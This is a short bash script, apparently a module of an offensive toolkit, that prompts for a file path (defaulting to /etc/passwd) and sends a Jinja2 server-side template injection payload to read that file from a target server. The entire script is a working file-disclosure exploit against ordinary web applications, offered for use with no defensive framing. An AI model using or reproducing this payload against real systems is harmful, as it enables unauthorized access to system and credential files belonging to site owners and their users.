#!/bin/bash

: '
SSTI - jinja2 lfi dump file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_FIELD=$(form_item "read file" "file" "/etc/passwd")

# Generate GUI form
generate_form "${FILE_FIELD}"

FILE=${form_data["file"]}

execute_command "{{ self.__init__.__globals__.__builtins__.open(\"${FILE}\").read() }}"
create_new_line
